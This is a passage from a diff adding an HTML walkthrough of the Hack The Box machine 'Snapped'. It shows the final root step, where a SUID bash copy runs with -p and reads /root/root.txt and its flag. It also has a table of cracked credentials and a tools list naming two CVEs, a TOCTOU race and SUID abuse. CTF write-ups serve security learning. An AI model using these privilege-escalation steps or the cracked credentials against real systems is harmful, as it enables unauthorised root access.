+<span class="highlight">  ROOT SHELL: /var/snap/firefox/common/bash -p</span>
+<span class="highlight">================================================================</span></pre>
+    </div>
+  </div>
+
+  <!-- Root -->
+  <div class="step-card" style="border-color: rgba(239,68,68,0.4);">
+    <div class="step-number" style="background: var(--red);">🏆</div>
+    <div class="step-title">👑 Root!</div>
+    <div class="step-meta"><span class="cve">ROOT</span> <span class="tag" style="background:rgba(34,197,94,0.15);color:var(--green);">FLAG CAPTURED</span></div>
+
+    <div class="cmd-block">
+      <div class="cmd-header"><span class="lang">root shell</span><span>SUID bash</span></div>
+      <pre><span class="prompt">$</span> ls -la /var/snap/firefox/common/bash
+<span class="output">-rwsr-xr-x 1 root jonathan 1396520 ... /var/snap/firefox/common/bash</span>
+
+<span class="prompt">$</span> /var/snap/firefox/common/bash -p
+<span class="output highlight">bash-5.1# id</span>
+<span class="output">uid=1000(jonathan) gid=1000(jonathan) euid=0(root) groups=1000(jonathan)</span>
+
+<span class="output highlight">bash-5.1# cat /root/root.txt</span>
+<span class="output highlight">43dd75679b26f1aa64a025e84bfd4ed7</span></pre>
+    </div>
+  </div>
+</section>
+
+<!-- Credentials Summary -->
+<section class="section">
+  <div class="section-header">
+    <div class="icon" style="background:rgba(245,158,11,0.12);">🔐</div>
+    <h2>Credentials Recovered</h2>
+    <span class="step-count">1 user</span>
+  </div>
+
+  <table class="cred-table">
+    <thead>
+      <tr><th>Username</th><th>Password</th><th>Service</th><th>Method</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td style="color:var(--accent);">jonathan</td>
+        <td style="color:var(--green);">linkinpark</td>
+        <td>SSH / Nginx UI</td>
+        <td>bcrypt crack (rockyou) + password reuse</td>
+      </tr>
+      <tr>
+        <td style="color:var(--text-dim);">admin</td>
+        <td style="color:var(--text-dim);">[uncracked]</td>
+        <td>Nginx UI</td>
+        <td>bcrypt hash present, not cracked</td>
+      </tr>
+    </tbody>
+  </table>
+</section>
+
+<!-- Tools Used -->
+<section class="section">
+  <div class="section-header">
+    <div class="icon" style="background:rgba(168,85,247,0.12);">🧰</div>
+    <h2>Tools & Techniques</h2>
+    <span class="step-count">toolkit</span>
+  </div>
+
+  <div style="display:flex;flex-wrap:wrap;gap:10px;">
+    <span style="padding:6px 16px;background:var(--bg2);border:1px solid var(--border);border-radius:100px;font-size:13px;">nmap</span>
+    <span style="padding:6px 16px;background:var(--bg2);border:1px solid var(--border);border-radius:100px;font-size:13px;">ffuf</span>
+    <span style="padding:6px 16px;background:var(--bg2);border:1px solid var(--border);border-radius:100px;font-size:13px;">curl</span>
+    <span style="padding:6px 16px;background:var(--bg2);border:1px solid var(--border);border-radius:100px;font-size:13px;">openssl</span>
+    <span style="padding:6px 16px;background:var(--bg2);border:1px solid var(--border);border-radius:100px;font-size:13px;">sqlite3</span>
+    <span style="padding:6px 16px;background:var(--bg2);border:1px solid var(--border);border-radius:100px;font-size:13px;">hashcat</span>
+    <span style="padding:6px 16px;background:var(--bg2);border:1px solid var(--border);border-radius:100px;font-size:13px;">sshpass</span>
+    <span style="padding:6px 16px;background:var(--bg2);border:1px solid var(--border);border-radius:100px;font-size:13px;">systemd-run</span>
+    <span style="padding:6px 16px;background:var(--bg2);border:1px solid var(--border);border-radius:100px;font-size:13px;">snap-confine</span>
+    <span style="padding:6px 16px;background:var(--bg2);border:1px solid var(--border);border-radius:100px;font-size:13px;">gcc</span>
+    <span style="padding:6px 16px;background:var(--bg2);border:1px solid var(--border);border-radius:100px;font-size:13px;">CVE-2026-27944</span>
+    <span style="padding:6px 16px;background:var(--bg2);border:1px solid var(--border);border-radius:100px;font-size:13px;">CVE-2026-3888</span>
+    <span style="padding:6px 16px;background:var(--bg2);border:1px solid var(--border);border-radius:100px;font-size:13px;">TOCTOU Race</span>
+    <span style="padding:6px 16px;background:var(--bg2);border:1px solid var(--border);border-radius:100px;font-size:13px;">SUID Abuse</span>
+  </div>
+</section>
+
+<!-- Footer -->
+<footer class="footer">
+  <p>Snapped — Hack The Box Hard Linux Machine</p>
+  <p>Walkthrough generated by <strong>BlackMagic Operator</strong></p>
+  <p class="sig">./pawn.sh --target snapped.htb --root 💀</p>
+  <p style="margin-top:16px;font-size:11px;color:var(--text-dim);">Jun 10, 2026</p>
+</footer>
+
+</div>
+
+</body>
+</html>
